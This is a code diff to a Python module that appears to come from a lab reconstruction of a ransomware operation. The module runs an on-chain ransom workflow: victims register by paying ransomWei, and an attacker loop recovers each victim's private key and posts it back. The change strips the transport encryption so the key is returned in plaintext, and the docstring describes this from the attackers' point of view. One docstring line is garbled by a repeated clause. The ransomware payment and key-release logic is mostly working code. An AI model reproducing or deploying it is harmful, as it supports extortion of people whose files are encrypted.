@@ -36,16 +36,15 @@ import lab_keylogic
 import lab_wallet
 
 
-SELECTOR_REGISTER = keccak(text="registerVictim(bytes,bytes)")[:4]
+SELECTOR_REGISTER = keccak(text="registerVictim(bytes)")[:4]
 SELECTOR_SUBMIT_REPLY = keccak(text="submitReply(uint256,bytes)")[:4]
 SELECTOR_GET_REPLY = keccak(text="getReply(uint256)")[:4]
 SELECTOR_REQUESTS = keccak(text="requests(uint256)")[:4]
-EVENT_REGISTERED = keccak(text="VictimRegistered(uint256,address,bytes)")
+EVENT_REGISTERED = keccak(text="VictimRegistered(uint256,address)")
 
 # Storing ~1.4 KB of sealed blob per request costs roughly 1M gas in
-# SSTORE writes; the reply carries ~2.5 KB (it contains the RSA-wrapped
-# victim_priv) and costs ~1.8M. Keep both well below the chain's 5.27M
-# block gas limit.
+# SSTORE writes; the reply carries the victim_priv PEM in plaintext (~1.7 KB)
+# and costs ~1.2M. Keep both well below the chain's 5.27M block gas limit.
 GAS_REGISTER = 3000000
 GAS_REPLY = 4000000
 POLL_SECONDS = 5
@@ -164,10 +163,10 @@ def register_request(
 ) -> dict:
     """Post one paid registration transaction for the saved exchange request.
 
-    The request file must already exist (it holds the ephemeral key the
-    reply will be sealed to). Sends registerVictim with exactly ransomWei
-    attached; the contract reverts otherwise. Returns the updated request
-    record including the on-chain request id.
+    The request file must already exist (it holds the inert sealed blob).
+    Sends registerVictim with exactly ransomWei attached; the contract
+    reverts otherwise. Returns the updated request record including the
+    on-chain request id.
     """
     request = json.loads(request_path.read_text(encoding="utf-8"))
     address = discover_contract(config)
@@ -183,10 +182,7 @@ def register_request(
     account = load_wallet_key(wallet_file, password)
 
     sealed_blob = json.dumps(request["victim_priv_sealed"]).encode("utf-8")
-    data = (
-        SELECTOR_REGISTER
-        + abi_encode(["bytes", "bytes"], [unb64(request["ephemeral_pub_b64"]), sealed_blob])
-    )
+    data = SELECTOR_REGISTER + abi_encode(["bytes"], [sealed_blob])
     tx_hash = send_tx(
         config, account, address, value=config["ransom_wei"], data=data, gas=GAS_REGISTER
     )
@@ -273,18 +269,17 @@ def poll_requests(config: dict, start_id: int = 0) -> list:
             address,
             SELECTOR_REQUESTS,
             next_id,
-            ["address", "bytes", "bytes", "bool"],
+            ["address", "bytes", "bool"],
         )
         if result is None:
             break
-        victim, ephemeral_pub, sealed_blob, answered = result
+        victim, sealed_blob, answered = result
         if victim == "0x" + "0" * 40:
             break  # unmapped id: end of registered requests
         found.append(
             {
                 "id": next_id,
                 "victim": victim,
-                "ephemeral_pub_b64": b64(bytes(ephemeral_pub)),
                 "sealed_blob_json": bytes(sealed_blob).decode("utf-8"),
                 "answered": answered,
             }
@@ -303,12 +298,13 @@ def attacker_watch(
 
     This is the full attacker loop the original incident needed a TOR C2
     plus manual steps for: read the sealed blob from the request itself,
-    recover victim_priv with attacker_priv, seal it to the victim's ephemeral
-    key, and post the reply in one signed transaction.
+    recover victim_priv with attacker_priv, and post it back on-chain in
+    PLAINTEXT - as the attackers we do not care who reads it once the
+    ransom has arrived.
 
     The victim's keylog is NOT needed on the attacker machine: the on-chain
-    request already carries the sealed victim_priv blob, and the reply hands
-    back only victim_priv — the victim unseals its own file key locally.
+    request already carries the sealed victim_priv blob, and the victim
+    unseals its own file key locally — the victim unseals its own file key locally.
     This keeps the two-host split honest (host_1 never touches host_0 files).
     """
     attacker_keys = json.loads(attacker_keys_path.read_text(encoding="utf-8"))
@@ -341,15 +337,12 @@ def attacker_watch(
         victim_priv_pem = lab_keylogic.attacker_open_victim_priv(
             unb64(attacker_keys["attacker_priv_pem"]), keylog_view
         )
-        request = {
-            "participant_id": "",
-            "ephemeral_pub_b64": entry["ephemeral_pub_b64"],
-        }
-        reply = lab_keylogic.attacker_build_reply(request, victim_priv_pem)
-        sealed_reply = json.dumps(reply).encode("utf-8")
+        # Plaintext reply: no transport sealing, no ephemeral keys.
+        reply = lab_keylogic.attacker_build_reply(victim_priv_pem)
+        plain_reply = json.dumps(reply).encode("utf-8")
         data = (
             SELECTOR_SUBMIT_REPLY
-            + abi_encode(["uint256", "bytes"], [entry["id"], sealed_reply])
+            + abi_encode(["uint256", "bytes"], [entry["id"], plain_reply])
         )
         tx_hash = send_tx(
             config, chain_account, address, value=0, data=data, gas=GAS_REPLY
